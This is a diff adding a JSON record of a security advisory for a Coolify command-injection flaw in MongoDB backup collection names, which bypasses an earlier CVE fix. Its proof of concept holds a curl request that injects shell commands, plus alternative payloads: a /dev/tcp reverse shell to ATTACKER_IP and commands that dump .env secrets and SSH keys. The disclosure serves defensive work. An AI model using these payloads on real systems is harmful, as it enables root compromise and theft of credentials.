@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-4mpw-wcj4-v9pp",
+  "repo": {
+    "cve_id": "CVE-2026-34049",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 3.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "### Summary\r\n\r\nThe fix for CVE-2025-66209 in Coolify v4.0.0-beta.451 is incomplete. While database names in the `databases_to_backup` field are now validated with `validateShellSafePath()` and escaped with `escapeshellarg()`, **MongoDB collection names** specified in the same field (format: `dbname:collection1,collection2`) are **never validated or escaped**. An authenticated user with database backup permissions can inject arbitrary shell commands via collection names, achieving full remote code execution on the managed server. Tested on v4.0.0-beta.469 (commit `06f60c9a98bead0c932c6adf7fd43a45d9149048`).\r\n\r\n### Details\r\n\r\nThe `databases_to_backup` field for MongoDB databases supports a special format: `dbname:collection1,collection2|dbname2:collection3` where the part after `:` specifies collections to exclude.\r\n\r\nIn `app/Jobs/DatabaseBackupJob.php`, the CVE-2025-66209 fix correctly validates and escapes the database name, but the collection names are directly interpolated into the shell command without any sanitization:\r\n\r\n**Vulnerable code** ([permalink](https://github.com/coollabsio/coolify/blob/06f60c9a98bead0c932c6adf7fd43a45d9149048/app/Jobs/DatabaseBackupJob.php#L490-L513)):\r\n\r\n```php\r\nif (str($databaseWithCollections)->contains(':')) {\r\n    $databaseName = str($databaseWithCollections)->before(':');\r\n    $collectionsToExclude = str($databaseWithCollections)->after(':')->explode(',');\r\n} else {\r\n    $databaseName = $databaseWithCollections;\r\n    $collectionsToExclude = collect();\r\n}\r\n$commands[] = 'mkdir -p '.$this->backup_dir;\r\n\r\n// Validate and escape database name to prevent command injection\r\nvalidateShellSafePath($databaseName, 'database name');           // <-- DB name: FIXED\r\n$escapedDatabaseName = escapeshellarg($databaseName);             // <-- DB name: FIXED\r\n\r\nif ($collectionsToExclude->count() === 0) {\r\n    // ... safe path ...\r\n} else {\r\n    if (str($this->database->image)->startsWith('mongo:4')) {\r\n        // $collectionsToExclude is NOT validated or escaped:\r\n        $commands[] = \"docker exec $this->container_name mongodump --uri=$url --gzip --excludeCollection \"\r\n            .$collectionsToExclude->implode(' --excludeCollection ')\r\n            .\" --archive > $this->backup_location\";\r\n    } else {\r\n        // Same issue on this branch:\r\n        $commands[] = \"docker exec $this->container_name mongodump --authenticationDatabase=admin --uri=\\\"$url\\\" --db $escapedDatabaseName --gzip --excludeCollection \"\r\n            .$collectionsToExclude->implode(' --excludeCollection ')\r\n            .\" --archive > $this->backup_location\";\r\n    }\r\n}\r\n```\r\n\r\n**Compare with safe code in the same function (database name):**\r\n\r\n```php\r\n// The database name IS properly validated and escaped:\r\nvalidateShellSafePath($databaseName, 'database name');\r\n$escapedDatabaseName = escapeshellarg($databaseName);\r\n```\r\n\r\nThe collection names should receive the same treatment but don't.\r\n\r\n**API input validation is also insufficient.** Both the `create_backup` and `update_backup` API endpoints in `app/Http/Controllers/Api/DatabasesController.php` only validate `databases_to_backup` as `'string|nullable'` ([line 696](https://github.com/coollabsio/coolify/blob/06f60c9a98bead0c932c6adf7fd43a45d9149048/app/Http/Controllers/Api/DatabasesController.php#L696), [line 911](https://github.com/coollabsio/coolify/blob/06f60c9a98bead0c932c6adf7fd43a45d9149048/app/Http/Controllers/Api/DatabasesController.php#L911)) -- no shell safety validation.\r\n\r\nThe Livewire component (`BackupEdit.php`) does validate with `validateShellSafePath`, but it splits by `,` only (for PostgreSQL/MySQL format), not by `|` or `:` (MongoDB format), so collection names are not individually validated even through the web UI.\r\n\r\n**Full attack chain:**\r\n\r\n1. Authenticated user creates/updates a MongoDB database backup via API with `databases_to_backup: \"mydb:$(touch /tmp/pwned)\"`\r\n2. The backup job runs (immediately if `backup_now: true`, or on schedule)\r\n3. `DatabaseBackupJob` parses: `$databaseName = \"mydb\"` (passes validation), `$collectionsToExclude = [\"$(touch /tmp/pwned)\"]` (NOT validated)\r\n4. Shell command: `docker exec <container> mongodump ... --excludeCollection $(touch /tmp/pwned) --archive > ...`\r\n5. This is passed to `instant_remote_process()` which wraps it in an SSH heredoc and executes via bash on the remote server\r\n6. Command substitution `$(touch /tmp/pwned)` executes as root on the managed server\r\n\r\n### PoC\r\n\r\n```bash\r\n# Prerequisites:\r\n# - A Coolify instance with a MongoDB database deployed\r\n# - An API token with write access (any team member)\r\n# - The database UUID and an existing backup config UUID\r\n\r\nCOOLIFY_URL=\"https://coolify.example.com\"\r\nAPI_TOKEN=\"your-api-token-here\"\r\nDB_UUID=\"your-mongodb-uuid\"\r\n\r\n# Step 1: Create a backup config with malicious collection name\r\ncurl -s -X POST \"$COOLIFY_URL/api/v1/databases/$DB_UUID/backups\" \\\r\n  -H \"Authorization: Bearer $API_TOKEN\" \\\r\n  -H \"Content-Type: application/json\" \\\r\n  -d '{\r\n    \"frequency\": \"every_minute\",\r\n    \"enabled\": true,\r\n    \"databases_to_backup\": \"admin:\\$(id > /tmp/coolify-rce-proof)\",\r\n    \"backup_now\": true\r\n  }'\r\n\r\n# Step 2: Wait for backup job to execute (runs immediately with backup_now: true)\r\nsleep 10\r\n\r\n# Step 3: Verify RCE by checking if the file was created on the managed server\r\n# (via another API call, Coolify UI, or direct SSH access)\r\n# The file /tmp/coolify-rce-proof should contain the output of `id`\r\n# running as root on the managed server.\r\n\r\n# Alternative payloads:\r\n# - Reverse shell: \"admin:\\$(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')\"\r\n# - Read secrets: \"admin:\\$(cat /var/www/html/.env > /tmp/env-dump)\"\r\n# - Pivot to all servers: \"admin:\\$(cat /var/www/html/storage/app/ssh/keys/* > /tmp/all-ssh-keys)\"\r\n```\r\n\r\n### Impact\r\n\r\nAn authenticated user with database management permissions (any team member by default) can execute arbitrary commands with root privileges on any managed server. This allows:\r\n\r\n1. **Full server compromise**: Commands execute on the host system with root access and Docker socket access\r\n2. **Credential theft**: Access to SSH keys, environment variables, and secrets for ALL servers managed by the Coolify instance\r\n3. **Lateral movement**: Using stolen SSH keys to pivot to all managed servers\r\n4. **Persistence**: Malicious payload re-executes on every scheduled backup run\r\n5. **Container escape**: Direct access to Docker socket enables escaping container isolation\r\n\r\nThis is a bypass of CVE-2025-66209 and affects the \"fixed\" version v4.0.0-beta.451+.\r\n",
+    "ghsa_id": "GHSA-4mpw-wcj4-v9pp",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-4mpw-wcj4-v9pp",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-4mpw-wcj4-v9pp"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-34049"
+      }
+    ],
+    "published_at": "2026-07-02T16:37:26Z",
+    "references": [],
+    "severity": "low",
+    "summary": "Incomplete fix for CVE-2025-66209: Command Injection via unsanitized MongoDB collection names in database backup",
+    "updated_at": "2026-07-02T16:37:26Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "coollabsio/coolify"
+        },
+        "patched_versions": "4.0.0-beta.471",
+        "vulnerable_version_range": ">= 4.0.0-beta.451, <= 4.0.0-beta.470"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
